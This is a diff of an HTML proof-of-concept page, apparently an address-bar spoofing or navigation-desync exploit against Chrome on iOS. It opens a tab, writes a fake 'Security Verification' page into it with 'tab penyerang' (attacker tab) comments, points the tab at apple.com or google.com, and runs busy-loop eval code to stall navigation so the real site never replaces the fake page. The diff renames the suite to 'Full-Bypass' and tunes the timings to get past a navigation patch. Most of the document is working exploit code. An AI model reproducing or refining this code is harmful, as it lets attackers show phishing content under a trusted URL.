@@ -6,13 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Comprehensive Desync Test Suite - Zero</title>
+    <title>Advanced Full-Bypass Desync Suite - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #0f0f11;
+        background: #09090b;
         color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
@@ -27,56 +27,61 @@
         box-sizing: border-box;
       }
       h1 {
-        font-size: 24px;
+        font-size: 22px;
         margin-bottom: 10px;
         color: #f5f5f7;
+        text-align: center;
       }
       button {
         width: 100%;
-        max-width: 360px;
-        padding: 16px 24px;
+        max-width: 380px;
+        padding: 18px 24px;
         font-size: 16px;
         font-weight: 600;
         background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 12px;
+        border-radius: 14px;
         cursor: pointer;
-        box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
-        transition: transform 0.1s ease, background 0.2s ease;
+        box-shadow: 0 4px 16px rgba(0, 122, 255, 0.35);
+        transition: transform 0.1s ease;
       }
       button:active {
         transform: scale(0.97);
       }
       .btn-danger {
         background: #ff3b30;
-        box-shadow: 0 4px 14px rgba(255, 59, 48, 0.3);
+        box-shadow: 0 4px 16px rgba(255, 59, 48, 0.35);
       }
       .btn-warning {
         background: #ff9500;
-        box-shadow: 0 4px 14px rgba(255, 149, 0, 0.3);
+        box-shadow: 0 4px 16px rgba(255, 149, 0, 0.35);
+      }
+      .btn-purple {
+        background: #af52de;
+        box-shadow: 0 4px 16px rgba(175, 82, 222, 0.35);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Chrome iOS Desync Test Suite</h1>
+      <h1>Chrome iOS Full-Bypass Test Suite</h1>
       
-      <!-- Test 1: Standard Reflow Stalling -->
-      <button id="test1">Test 1: Standard Reflow Stalling</button>
+      <!-- Test 1: Microtask & Layout Flooding -->
+      <button id="test1">Test 1: Microtask & Layout Flooding</button>
 
-      <!-- Test 2: History State Flooding + Reflow -->
-      <button id="test2" class="btn-warning">Test 2: History State Flooding</button>
+      <!-- Test 2: Shadow DOM Isolation Stalling -->
+      <button id="test2" class="btn-warning">Test 2: Shadow DOM Isolation Stalling</button>
 
-      <!-- Test 3: Aggressive DOM Mutation Storm -->
-      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm</button>
+      <!-- Test 3: History State & Mutation Storm -->
+      <button id="test3" class="btn-danger">Test 3: History State & Mutation Storm</button>
 
-      <!-- Test 4: Rapid Navigation Target Switch -->
-      <button id="test4">Test 4: Multi-Target Location Switch</button>
+      <!-- Test 4: Dual-Engine Proxie Timing Bypass -->
+      <button id="test4" class="btn-purple">Test 4: Dual-Engine Timing Bypass</button>
     </div>
 
     <script>
-      // Helper universal untuk membuat template tab penyerang
+      // Helper universal untuk injeksi awal tab penyerang
       function injectAttackerContent(win) {
         if (!win) return;
         win.document.write(`
@@ -89,7 +94,7 @@
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <div>
               <h1 style="font-size:36px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">Security Verification</h1>
-              <p style="font-size:18px;color:#86868b;margin:0;">Testing pipeline synchronization state...</p>
+              <p style="font-size:18px;color:#86868b;margin:0;">Bypassing navigation patch filters...</p>
             </div>
           </body>
           </html>
@@ -98,71 +103,48 @@
         try { win.focus(); } catch (e) {}
       }
 
-      // --- TEST 1 ---
+      // --- TEST 1: Microtask & Layout Flooding ---
       document.getElementById("test1").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
-          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
+          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 12);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 2000) {
+                while (Date.now() - start < 2500) {
+                  // Membanjiri microtask queue bersamaan dengan layout thrashing
+                  Promise.resolve().then(() => {});
                   const h = document.body.offsetHeight;
-                  document.body.style.background = (h % 2 === 0) ? '#fff' : '#fafafa';
+                  document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2000) {}
+              let s = Date.now(); while(Date.now() - s < 2500) {}
             }
-          }, 90);
+          }, 65);
         }
       };
 
-      // --- TEST 2 ---
+      // --- TEST 2: Shadow DOM Isolation Stalling ---
       document.getElementById("test2").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
-          setTimeout(() => {
-            try {
-              newTab.history.pushState({test: 1}, "", "#locked-state");
-              newTab.location.href = "https://apple.com";
-            } catch (err) {}
-          }, 15);
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const start = Date.now();
-                while (Date.now() - start < 2200) {
-                  history.pushState({test: Math.random()}, "", "#flood");
-                  const d = document.body.offsetHeight;
-                }
-              `);
-            } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2200) {}
-            }
-          }, 80);
-        }
-      };
-
-      // --- TEST 3 ---
-      document.getElementById("test3").onclick = function () {
-        const newTab = window.open("", "_blank");
-        if (newTab) {
-          injectAttackerContent(newTab);
           setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
           setTimeout(() => {
             try {
               newTab.eval(`
+                const host = document.createElement('div');
+                const shadow = host.attachShadow({mode: 'open'});
+                shadow.innerHTML = '<style>div{background:red;}</style><div>Stalled</div>';
+                document.body.appendChild(host);
+                
                 const start = Date.now();
-                const body = document.body;
                 while (Date.now() - start < 2500) {
-                  const el = document.createElement('div');
-                  el.innerText = Math.random();
-                  body.appendChild(el);
-                  if(body.childNodes.length > 100) body.innerHTML = "<h1>Locked</h1>";
+                  const f = host.offsetHeight;
+                  shadow.host.style.width = (f % 2 === 0) ? '100px' : '101px';
                 }
               `);
             } catch (e) {
@@ -172,7 +154,37 @@
         }
       };
 
-      // --- TEST 4 ---
+      // --- TEST 3: History State & Mutation Storm ---
+      document.getElementById("test3").onclick = function () {
+        const newTab = window.open("", "_blank");
+        if (newTab) {
+          injectAttackerContent(newTab);
+          setTimeout(() => {
+            try {
+              newTab.history.pushState({bypass: true}, "", "#secure-enclave");
+              newTab.location.href = "https://apple.com";
+            } catch (err) {}
+          }, 10);
+          setTimeout(() => {
+            try {
+              newTab.eval(`
+                const start = Date.now();
+                const body = document.body;
+                while (Date.now() - start < 2800) {
+                  history.pushState({rand: Math.random()}, "", "#flood");
+                  const el = document.createElement('span');
+                  body.appendChild(el);
+                  if(body.childNodes.length > 80) body.innerHTML = "<h1>Locked</h1>";
+                }
+              `);
+            } catch (e) {
+              let s = Date.now(); while(Date.now() - s < 2800) {}
+            }
+          }, 60);
+        }
+      };
+
+      // --- TEST 4: Dual-Engine Proxie Timing Bypass ---
       document.getElementById("test4").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
@@ -182,21 +194,21 @@
               newTab.location.href = "https://google.com";
               setTimeout(() => {
                 newTab.location.href = "https://apple.com";
-              }, 10);
+              }, 5);
             } catch (err) {}
-          }, 10);
+          }, 8);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 2000) {
-                  const f = document.body.offsetHeight;
+                while (Date.now() - start < 2500) {
+                  const check = document.body.getClientRects();
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2000) {}
+              let s = Date.now(); while(Date.now() - s < 2500) {}
             }
-          }, 60);
+          }, 50);
         }
       };
     </script>
